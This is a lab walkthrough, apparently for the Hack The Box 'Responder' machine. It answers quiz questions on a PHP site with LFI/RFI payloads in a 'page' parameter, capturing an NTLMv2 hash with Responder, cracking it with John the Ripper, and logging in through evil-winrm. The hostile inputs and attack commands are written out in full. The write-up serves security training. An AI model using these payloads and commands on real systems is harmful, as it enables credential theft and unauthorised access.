<span style="color:cyan">**Question 1**</span>:When visiting the web service using the IP address, what is the domain that we are being redirected to?

Visiting the web service using the IP address, we are being redirected to unika.htb domain. 

    unika.htb

<span style="color:cyan">**Question 2**</span>: Which scripting language is being used on the server to generate webpages?

The scripting language used on the server to generate webpages can vary depending on the technology stack chosen by the developers. 

Running `Nmap`, the results showed that port 80 is active and that `Apache` is using PHP to generate the webpage

```
cmd : nmap -sV -sC -v IP address

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Thus, the scripting language used is PHP.

    php

<span style="color:cyan">**Question 3**</span>: What is the name of the URL parameter which is used to load different language versions of the webpage?

The name of the URL parameter used to load different language versions of the webpage is page.
 
    page

<span style="color:cyan">**Question 4**</span>: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

The value that would be an example of exploiting a Local File Include (LFI) vulnerability is:

    ../../../../../../../../windows/system32/drivers/etc/hosts

This exploits the application by trying to include files from the server’s file system.

<span style="color:cyan">**Question 5**</span>: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

    //10.10.14.6/somefile

This allows an attacker to include files from a remote server, potentially compromising the application.

<span style="color:cyan">**Question 6**</span>: What does NTLM stand for?

NTLM stands for "NT LAN Manager." It is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users

    NT LAN Manager

<span style="color:cyan">**Question 7**</span>: Which flag do we use in the Responder utility to specify the network interface?

In the Responder utility, the -I flag is used to specify the network interface.

    -I

<span style="color:cyan">**Question 8**</span>: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

`John the Ripper` is a widely used open-source password cracking tool that can perform various types of password attacks, including dictionary attacks, brute-force attacks, and cryptanalysis attacks

    John the ripper

<span style="color:cyan">**Question 9**</span>: What is the password for the administrator user?

To find the administrator password, I first run the command `ip a` to get a detailed list of available network interfaces:

```cmd
cmd: ip a

tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.180/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::11b2/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::acd2:99f2:9340:e8f6/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
```

At this point, I use Responder to intercept the website using the network interface `tun0`:

```cmd
cmd: sudo responder -I tun0 -v
```

Now, taking advantage of the ability to change the language on the site `unika.htb`, I attempt an `RFI` attack, leveraging the output from `Responder`. I see the following in the terminal, which contains the hashed password:

```cmd
Administrator::RESPONDER:a0000050b7824dc2:7DF339DFFAED8C5DFA073D0D3A9D1622:010100000000000000E6E5E06F0BDB01178991186750514B0000000002000800450041005100530001001E00570049004E002D0046004200500042004500380054004E004700360044000400...
```

At this point, I use `John the Ripper` to try to recover the administrator's password: 

```cmd
cmd : sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Finally, I find the password:

    baddminton (Administrator)

<span style="color:cyan">**Question 10**</span>: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

The answer to this question is already contained in the output of the nmap command run earlier, which shows that port 5985 is active.

<span style="color:cyan">**Question 11**</span>: Submit root flag

At this point, knowing the username and password, I can use `evil-winrm` to connect to the Windows machine, access it, and find the flag.

```cmd
cmd : sudo evil-winrm -u Administrator -p badminton -i 10.129.217.61
```
By navigating through the file system, I find the file flag.txt which contains the flag!